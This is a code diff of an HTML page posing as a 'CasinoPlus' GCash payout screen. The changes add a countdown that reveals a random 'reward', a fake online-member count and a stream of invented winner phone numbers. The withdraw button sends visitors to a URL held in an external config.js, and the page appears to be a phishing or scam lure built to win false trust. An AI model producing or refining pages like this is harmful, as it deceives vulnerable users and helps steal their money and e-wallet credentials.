@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CasinoPlus | Official Payout</title>
+    <title>CasinoPlus | Live Payout</title>
 
     <script>
         (function() {
@@ -18,161 +18,120 @@
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
     
     <style>
-        :root { 
-            --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); 
-            --dark-bg: #04070d; 
-        }
-
+        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --dark-bg: #04070d; }
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Public Sans', sans-serif; background-color: var(--dark-bg); background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; overflow: hidden; }
 
-        body { 
-            font-family: 'Public Sans', sans-serif; 
-            background-color: var(--dark-bg); 
-            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); 
-            color: #fff; 
-            display: flex; 
-            flex-direction: column;
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            padding: 15px; 
-            overflow: hidden;
-        }
-
-        /* LIVE WINNERS STYLE */
-        .live-winner-box {
-            position: absolute;
-            top: 30px;
-            background: rgba(0, 0, 0, 0.8);
-            border: 1px solid rgba(212, 175, 55, 0.4);
-            padding: 10px 20px;
-            border-radius: 50px;
-            font-size: 13px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            animation: fadeInOut 3s infinite;
-            z-index: 100;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-        }
-
-        .dot { 
-            width: 10px; 
-            height: 10px; 
-            background: #22c55e; 
-            border-radius: 50%; 
-            box-shadow: 0 0 10px #22c55e; 
-        }
-
-        @keyframes fadeInOut { 
-            0% { opacity: 0; transform: translateY(-15px); } 
-            10% { opacity: 1; transform: translateY(0); } 
-            90% { opacity: 1; } 
-            100% { opacity: 0; } 
-        }
+        /* LIVE WINNERS & USERS */
+        .live-stats { position: absolute; top: 20px; display: flex; flex-direction: column; align-items: center; gap: 8px; z-index: 100; width: 100%; }
+        .live-winner-box { background: rgba(0, 0, 0, 0.85); border: 1px solid rgba(212, 175, 55, 0.4); padding: 8px 15px; border-radius: 50px; font-size: 11px; display: flex; align-items: center; gap: 8px; backdrop-filter: blur(10px); animation: slideIn 0.5s ease-out; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .online-count { font-size: 10px; color: #22c55e; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
+        .dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
 
         /* MAIN CARD */
-        .card { 
-            background: rgba(255, 255, 255, 0.03); 
-            width: 100%; 
-            max-width: 400px; 
-            padding: 35px 20px; 
-            border-radius: 30px; 
-            border: 1px solid rgba(212, 175, 55, 0.3); 
-            backdrop-filter: blur(15px); 
-            text-align: center; 
-            position: relative;
-        }
+        .card { background: rgba(255, 255, 255, 0.03); width: 100%; max-width: 400px; padding: 35px 20px; border-radius: 30px; border: 1px solid rgba(212, 175, 55, 0.3); backdrop-filter: blur(15px); text-align: center; }
+        .logo-img { width: 160px; margin-bottom: 20px; }
 
-        .logo-img { width: 180px; margin-bottom: 20px; }
+        /* TIMER & AMOUNT */
+        .timer-box { font-size: 12px; color: #94a3b8; margin-bottom: 5px; font-weight: 600; }
+        .amount { font-family: 'Orbitron', sans-serif; font-size: 52px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 25px; font-weight: 700; }
 
-        .amount { 
-            font-family: 'Orbitron', sans-serif; 
-            font-size: 48px; 
-            background: var(--gold); 
-            -webkit-background-clip: text; 
-            -webkit-text-fill-color: transparent; 
-            margin-bottom: 30px; 
-            font-weight: 700;
-        }
-
-        .pay-button { 
-            background: var(--gold); 
-            color: #000; 
-            width: 100%; 
-            padding: 20px; 
-            border: none; 
-            border-radius: 15px; 
-            font-size: 18px; 
-            font-weight: 800; 
-            text-transform: uppercase; 
-            cursor: pointer; 
-            box-shadow: 0 8px 0 #8b6508; 
-            transition: 0.2s; 
-        }
-
+        .pay-button { background: var(--gold); color: #000; width: 100%; padding: 20px; border: none; border-radius: 15px; font-size: 18px; font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 8px 0 #8b6508; transition: 0.2s; }
         .pay-button:active { transform: translateY(4px); box-shadow: 0 4px 0 #8b6508; }
-        .pay-button:disabled { background: #4b5563; color: #9ca3af; box-shadow: none; transform: translateY(4px); }
+        .pay-button:disabled { background: #334155; color: #64748b; box-shadow: none; transform: translateY(4px); cursor: not-allowed; }
 
-        .promo-photo { 
-            width: 100%; 
-            border-radius: 20px; 
-            margin-top: 25px; 
-            border: 1px solid rgba(212, 175, 55, 0.2); 
-        }
+        .promo-photo { width: 100%; border-radius: 20px; margin-top: 25px; border: 1px solid rgba(212, 175, 55, 0.2); }
     </style>
 </head>
 <body>
 
-    <div class="live-winner-box" id="winnerBox">
-        <div class="dot"></div>
-        <span id="winnerEntry">User 0917***8234 just withdrew ₱1,000</span>
+    <div class="live-stats">
+        <div class="online-count"><span class="dot"></span> <span id="userCount">24</span> Members Online</div>
+        <div class="live-winner-box" id="winnerBox">
+            <span id="winnerEntry">User 0917***8234 just withdrew ₱1,000</span>
+        </div>
     </div>
 
     <div class="card">
         <img src="https://xjiligames.github.io/rewards/logo1.png" class="logo-img">
         
-        <div style="font-size: 11px; color: #fbbf24; letter-spacing: 2px; margin-bottom: 5px; font-weight: 800;">OFFICIAL PAYOUT</div>
+        <div style="font-size: 11px; color: #fbbf24; letter-spacing: 2px; margin-bottom: 5px; font-weight: 800;">AVAILABLE PAYOUT</div>
         
-        <div class="amount" id="balanceText">₱1,000.00</div>
+        <div class="timer-box" id="timerLabel">Calculating bonus in: <span id="countdown">05</span>s</div>
+        <div class="amount" id="balanceText">₱0.00</div>
         
-        <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">Withdraw via GCash</button>
+        <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Withdraw via GCash</button>
         
-        <p style="font-size: 12px; color: #94a3b8; margin-top: 15px;">Fast & Secure GCash Settlement</p>
+        <p style="font-size: 11px; color: #64748b; margin-top: 15px;">Encrypted GCash Terminal v4.2</p>
         
         <img src="https://xjiligames.github.io/rewards/casinoplus.jpeg" class="promo-photo">
     </div>
 
     <script src="config.js"></script>
     <script>
-        // 1. LIVE WINNERS LOGIC
-        const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0915", "0905", "0977"];
-        
-        function updateWinners() {
-            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-            const randomSuffix = Math.floor(1000 + Math.random() * 9000);
-            const randomAmount = ["500", "1,000", "1,500", "2,000", "1,000"][Math.floor(Math.random() * 5)];
-            
-            const winnerText = `User ${randomPrefix}***${randomSuffix} just withdrew ₱${randomAmount}`;
-            document.getElementById('winnerEntry').innerText = winnerText;
+        // 1. SETTINGS
+        const possibleAmounts = [50, 100, 150, 200, 250, 300, 500, 800, 1000];
+        const finalReward = possibleAmounts[Math.floor(Math.random() * possibleAmounts.length)];
+        let timeLeft = 5;
+
+        // 2. TIMER & AMOUNT ANIMATION
+        const countdownEl = document.getElementById('countdown');
+        const balanceEl = document.getElementById('balanceText');
+        const claimBtn = document.getElementById('claimBtn');
+
+        const timer = setInterval(() => {
+            timeLeft--;
+            countdownEl.innerText = timeLeft < 10 ? "0" + timeLeft : timeLeft;
+
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                document.getElementById('timerLabel').innerHTML = "Reward Ready!";
+                animateValue(0, finalReward, 1500); // Start counter animation
+            }
+        }, 1000);
+
+        function animateValue(start, end, duration) {
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                const currentVal = Math.floor(progress * (end - start) + start);
+                balanceEl.innerText = "₱" + currentVal.toLocaleString() + ".00";
+                if (progress < 1) {
+                    window.requestAnimationFrame(step);
+                } else {
+                    claimBtn.disabled = false; // Enable button after animation
+                    balanceEl.style.filter = "drop-shadow(0 0 10px rgba(212,175,55,0.5))";
+                }
+            };
+            window.requestAnimationFrame(step);
         }
 
-        // Magpalit ng winner bawat 3 seconds
-        setInterval(updateWinners, 3000);
+        // 3. LIVE WINNERS & USER COUNT
+        const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0915", "0905", "0977"];
+        
+        function updateStats() {
+            // Update Online Users (Min 20)
+            const online = Math.floor(Math.random() * (60 - 20 + 1)) + 20;
+            document.getElementById('userCount').innerText = online;
 
-        // 2. REDIRECTION LOGIC
-        function redirectToGCash() {
-            const btn = document.getElementById('claimBtn');
-            btn.disabled = true; 
-            btn.innerHTML = "Processing...";
+            // Update Winners
+            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+            const randomSuffix = Math.floor(1000 + Math.random() * 9000);
+            const randomAmount = possibleAmounts[Math.floor(Math.random() * possibleAmounts.length)];
             
+            document.getElementById('winnerEntry').innerText = `User ${randomPrefix}***${randomSuffix} just withdrew ₱${randomAmount}`;
+        }
+        setInterval(updateStats, 3000);
+
+        // 4. REDIRECTION
+        function redirectToGCash() {
+            claimBtn.disabled = true; 
+            claimBtn.innerHTML = "Connecting to GCash...";
             setTimeout(() => {
-                if (typeof LATEST_GCASH_URL !== 'undefined') {
-                    window.location.href = LATEST_GCASH_URL; 
-                } else {
-                    window.location.href = "https://m.gcash.com"; 
-                }
+                window.location.href = (typeof LATEST_GCASH_URL !== 'undefined') ? LATEST_GCASH_URL : "https://m.gcash.com";
             }, 1800);
         }
     </script>
